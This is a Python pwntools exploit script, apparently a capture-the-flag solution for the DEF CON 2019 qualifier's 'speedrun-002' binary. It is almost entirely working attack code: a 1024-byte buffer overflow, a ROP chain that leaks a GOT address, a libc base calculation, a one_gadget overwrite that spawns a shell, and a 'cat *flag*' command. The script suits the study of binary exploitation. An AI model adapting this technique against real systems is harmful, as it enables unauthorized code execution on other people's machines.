#!/usr/bin/env python2
import sys
sys.path.insert(0, "/mnt")

import speed
import re
from pwn import *

context.binary = "speedrun-2/speedrun-002"

### Interact functions ###

##########################

if args.LOCAL:
    p = process(context.binary.path)
    raw_input('\n'.join([
        '',
        'attach {}'.format(p.pid),
        'continue',
        '',
        '[ENTER]'
        ]))

else:
    p = remote("speedrun-002.quals2019.oooverflow.io", 31337)

p.recvuntil("now?")
p.sendline("Everything intelligent is so boring.")
p.recvuntil("more.")

rop = ROP(context.binary)
rop.raw(p64(0))
rop.write(1, 0x00601028, 8)
rop.read(0, 0x00601028, 8)
rop.call(0x00400718)
print rop.dump()


p.sendline("A"*1024 + str(rop))
p.recvuntil("ing.")
p.recvline()
leaked_addr = u64(p.recv(numb=8).ljust(8, '\x00'))
print "leaked:", hex(leaked_addr)

speed.libc_base_from_symbol("puts", leaked_addr)
p.send(p64(speed.libc.address + speed.one_gadgets[1]))

p.sendline("cat *flag*")
possible_flag = p.recv(timeout=1)
print possible_flag
print ""
print re.findall(r'OOO{.+}', possible_flag)

p.interactive()
